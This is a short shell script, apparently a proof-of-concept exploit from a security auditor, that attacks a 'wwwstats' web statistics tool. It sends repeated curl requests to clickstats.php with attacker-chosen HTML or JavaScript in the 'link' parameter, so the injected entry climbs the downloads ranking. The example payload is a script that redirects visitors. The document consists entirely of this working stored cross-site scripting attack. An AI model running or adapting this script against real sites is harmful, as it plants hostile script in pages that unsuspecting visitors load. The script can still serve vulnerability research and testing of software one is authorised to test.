#!/bin/sh
#jolmos (at) isecauditors (dot) com

if [ $# -ne 4 ]
then
     echo "Usage:   $0 <target>
     <html or javascript to inject in downloads> <ranking position>"
     echo "Example: $0 http://www.example.com/wwwstats
     <script>window.location="http://www.example.com"</script> 100"
     exit
fi

echo 'Attacking, wait a moment'
for i in `seq 1 $3`; do curl "$1/clickstats.php?link=$2" -e 'attack'; done
